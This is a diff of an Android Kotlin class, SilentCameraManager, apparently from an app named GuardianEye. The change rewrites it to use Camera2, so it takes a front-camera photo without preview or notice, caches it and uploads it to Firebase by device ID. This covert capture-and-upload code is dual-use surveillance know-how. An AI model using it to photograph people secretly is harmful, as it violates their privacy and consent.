@@ -1,120 +1,195 @@
 package com.example.guardianeye.camera
 
 import android.content.Context
+import android.graphics.ImageFormat
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CaptureRequest
+import android.media.ImageReader
+import android.os.Handler
+import android.os.HandlerThread
 import android.util.Log
-import androidx.camera.core.CameraSelector
-import androidx.camera.core.ImageCapture
-import androidx.camera.core.ImageCaptureException
-import androidx.camera.lifecycle.ProcessCameraProvider
-import androidx.core.content.ContextCompat
-import androidx.lifecycle.LifecycleOwner
 import com.example.guardianeye.repository.FirebaseRepository
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
 import java.io.File
-import java.util.concurrent.ExecutorService
-import java.util.concurrent.Executors
+import java.io.FileOutputStream
 
 class SilentCameraManager(private val context: Context) {
 
     private val repository = FirebaseRepository()
-    private var cameraExecutor: ExecutorService =
-        Executors.newSingleThreadExecutor()
+    private val handlerThread = HandlerThread("CameraThread")
+    private lateinit var handler: Handler
+
+    init {
+        handlerThread.start()
+        handler = Handler(handlerThread.looper)
+    }
 
     suspend fun takeSilentPhoto(deviceId: String) {
-        withContext(Dispatchers.Main) {
-            try {
-                val cameraProviderFuture =
-                    ProcessCameraProvider.getInstance(context)
+        Log.d("SilentCamera", "Tentative de capture...")
 
-                cameraProviderFuture.addListener({
-                    val cameraProvider = cameraProviderFuture.get()
-                    val imageCapture = ImageCapture.Builder()
-                        .setCaptureMode(
-                            ImageCapture
-                                .CAPTURE_MODE_MINIMIZE_LATENCY
-                        )
-                        .build()
+        try {
+            val cameraManager = context.getSystemService(
+                Context.CAMERA_SERVICE
+            ) as CameraManager
 
-                    val cameraSelector = CameraSelector.Builder()
-                        .requireLensFacing(
-                            CameraSelector.LENS_FACING_FRONT
-                        )
-                        .build()
-
-                    try {
-                        cameraProvider.unbindAll()
-                        if (context is LifecycleOwner) {
-                            cameraProvider.bindToLifecycle(
-                                context,
-                                cameraSelector,
-                                imageCapture
-                            )
-                        }
-                        capturePhoto(
-                            imageCapture,
-                            deviceId,
-                            cameraProvider
-                        )
-                    } catch (e: Exception) {
-                        Log.e("Camera", "Erreur: ${e.message}")
-                    }
-                }, ContextCompat.getMainExecutor(context))
-
-            } catch (e: Exception) {
-                Log.e("Camera", "Init erreur: ${e.message}")
+            // Trouver la caméra frontale
+            var frontCameraId: String? = null
+            for (cameraId in cameraManager.cameraIdList) {
+                val chars = cameraManager
+                    .getCameraCharacteristics(cameraId)
+                val facing = chars.get(
+                    CameraCharacteristics.LENS_FACING
+                )
+                if (facing ==
+                    CameraCharacteristics.LENS_FACING_FRONT
+                ) {
+                    frontCameraId = cameraId
+                    break
+                }
             }
+
+            if (frontCameraId == null) {
+                Log.e("SilentCamera",
+                    "Caméra frontale non trouvée")
+                return
+            }
+
+            Log.d("SilentCamera",
+                "Caméra frontale trouvée: $frontCameraId")
+
+            val imageReader = ImageReader.newInstance(
+                640, 480,
+                ImageFormat.JPEG,
+                1
+            )
+
+            imageReader.setOnImageAvailableListener({ reader ->
+                val image = reader.acquireLatestImage()
+                if (image != null) {
+                    try {
+                        val buffer = image.planes[0].buffer
+                        val bytes = ByteArray(buffer.remaining())
+                        buffer.get(bytes)
+
+                        val photoFile = File(
+                            context.cacheDir,
+                            "guardian_${System.currentTimeMillis()}.jpg"
+                        )
+                        FileOutputStream(photoFile).use {
+                            it.write(bytes)
+                        }
+                        image.close()
+
+                        Log.d("SilentCamera",
+                            "Photo capturée ✅")
+
+                        CoroutineScope(Dispatchers.IO).launch {
+                            try {
+                                repository.uploadPhoto(
+                                    deviceId,
+                                    photoFile
+                                )
+                                Log.d("SilentCamera",
+                                    "Photo uploadée ✅")
+                            } catch (e: Exception) {
+                                Log.e("SilentCamera",
+                                    "Erreur upload: ${e.message}")
+                            }
+                        }
+                    } catch (e: Exception) {
+                        Log.e("SilentCamera",
+                            "Erreur traitement: ${e.message}")
+                        image.close()
+                    }
+                }
+            }, handler)
+
+            cameraManager.openCamera(
+                frontCameraId,
+                object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) {
+                        Log.d("SilentCamera",
+                            "Caméra ouverte ✅")
+                        try {
+                            val surface = imageReader.surface
+                            val captureRequest = camera
+                                .createCaptureRequest(
+                                    CameraDevice
+                                        .TEMPLATE_STILL_CAPTURE
+                                ).apply {
+                                    addTarget(surface)
+                                }.build()
+
+                            camera.createCaptureSession(
+                                listOf(surface),
+                                object : CameraCaptureSession
+                                .StateCallback() {
+                                    override fun onConfigured(
+                                        session: CameraCaptureSession
+                                    ) {
+                                        session.capture(
+                                            captureRequest,
+                                            null,
+                                            handler
+                                        )
+                                        Log.d("SilentCamera",
+                                            "Capture lancée ✅")
+
+                                        // Fermer après 3 secondes
+                                        handler.postDelayed({
+                                            session.close()
+                                            camera.close()
+                                            imageReader.close()
+                                        }, 3000)
+                                    }
+
+                                    override fun onConfigureFailed(
+                                        session: CameraCaptureSession
+                                    ) {
+                                        Log.e("SilentCamera",
+                                            "Config failed ❌")
+                                        camera.close()
+                                    }
+                                },
+                                handler
+                            )
+                        } catch (e: Exception) {
+                            Log.e("SilentCamera",
+                                "Erreur session: ${e.message}")
+                            camera.close()
+                        }
+                    }
+
+                    override fun onDisconnected(
+                        camera: CameraDevice
+                    ) {
+                        camera.close()
+                    }
+
+                    override fun onError(
+                        camera: CameraDevice,
+                        error: Int
+                    ) {
+                        Log.e("SilentCamera",
+                            "Erreur caméra: $error")
+                        camera.close()
+                    }
+                },
+                handler
+            )
+
+        } catch (e: Exception) {
+            Log.e("SilentCamera",
+                "Erreur générale: ${e.message}")
         }
     }
 
-    private fun capturePhoto(
-        imageCapture: ImageCapture,
-        deviceId: String,
-        cameraProvider: ProcessCameraProvider
-    ) {
-        val photoFile = File(
-            context.cacheDir,
-            "guardian_${System.currentTimeMillis()}.jpg"
-        )
-        val outputOptions = ImageCapture
-            .OutputFileOptions
-            .Builder(photoFile)
-            .build()
-
-        imageCapture.takePicture(
-            outputOptions,
-            cameraExecutor,
-            object : ImageCapture.OnImageSavedCallback {
-                override fun onImageSaved(
-                    output: ImageCapture.OutputFileResults
-                ) {
-                    CoroutineScope(Dispatchers.IO).launch {
-                        try {
-                            repository.uploadPhoto(
-                                deviceId,
-                                photoFile
-                            )
-                            photoFile.delete()
-                            cameraProvider.unbindAll()
-                        } catch (e: Exception) {
-                            Log.e("Camera", "Upload: ${e.message}")
-                        }
-                    }
-                }
-
-                override fun onError(
-                    exception: ImageCaptureException
-                ) {
-                    Log.e("Camera", "Capture: ${exception.message}")
-                    cameraProvider.unbindAll()
-                }
-            }
-        )
-    }
-
     fun shutdown() {
-        cameraExecutor.shutdown()
+        handlerThread.quitSafely()
     }
 }
